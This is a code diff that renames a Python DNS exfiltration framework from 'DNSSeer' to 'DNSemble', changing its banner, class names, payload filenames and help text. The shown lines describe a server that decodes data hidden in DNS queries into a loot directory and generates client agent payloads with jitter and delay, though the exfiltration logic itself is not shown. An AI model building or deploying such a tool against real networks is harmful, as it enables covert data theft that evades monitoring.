@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-DNSSeer Server — DNS Exfiltration Receiver
+DNSemble Server — DNS Exfiltration Receiver
 
 Listens for DNS queries, decodes the hidden data channel, and
 forwards every query to a real upstream resolver so the client
@@ -34,11 +34,11 @@ from domains import (
 
 BANNER = r"""
 {cyn}{bold}
-    ____  _   _______ _____
-   / __ \/ | / / ___// ___/___  ___  _____
-  / / / /  |/ /\__ \ \__ \/ _ \/ _ \/ ___/
- / /_/ / /|  /___/ /___/ /  __/  __/ /
-/_____/_/ |_//____//____/\___/\___/_/
+    ____  _   _____                 __    __
+   / __ \/ | / / ___/___  ____ ___  / /_  / /__
+  / / / /  |/ /\__ \/ _ \/ __ `__ \/ __ \/ / _ \
+ / /_/ / /|  /___/ /  __/ / / / / / /_/ / /  __/
+/_____/_/ |_//____/\___/_/ /_/ /_/_.___/_/\___/
 {rst}
   {dim}DNS Exfiltration Framework  ·  v1.0{rst}
   {dim}The domain IS the data.  Dynamic mapping.{rst}
@@ -93,7 +93,7 @@ class Session:
 
 # ── Server ────────────────────────────────────────────────────────────────
 
-class DNSSeerServer:
+class DNSembleServer:
     def __init__(self, port, upstream, loot_dir):
         self.port      = port
         self.upstream  = upstream
@@ -304,7 +304,7 @@ class DNSSeerServer:
 
     def _final_stats(self):
         print(f"\n{C.cyn}{'═' * 60}{C.rst}")
-        print(f"  {C.bold}DNSSeer shutting down{C.rst}")
+        print(f"  {C.bold}DNSemble shutting down{C.rst}")
         print(f"  Total queries processed : {self.total_q}")
         print(f"  Sessions completed      : {self.completed}")
         print(f"  Sessions still active   : {len(self.sessions)}")
@@ -391,7 +391,7 @@ def generate_payload(payload_key, host, port, jitter, delay, output):
 
     if output is None:
         safe_host = host.replace(".", "_")
-        output = f"dnsseer_agent_{safe_host}_{port}{info['extension']}"
+        output = f"dnssemble_agent_{safe_host}_{port}{info['extension']}"
 
     src_path = output
     exe_path = None
@@ -460,7 +460,7 @@ def generate_payload(payload_key, host, port, jitter, delay, output):
 
 def main():
     ap = argparse.ArgumentParser(
-        description="DNSSeer — DNS exfiltration framework",
+        description="DNSemble — DNS exfiltration framework",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=(
             "examples:\n"
@@ -507,7 +507,7 @@ def main():
         generate_payload(args.payload, args.host, args.port,
                          args.jitter, args.delay, args.output)
 
-    DNSSeerServer(args.port, args.upstream, args.loot_dir).start()
+    DNSembleServer(args.port, args.upstream, args.loot_dir).start()
 
 if __name__ == "__main__":
     main()
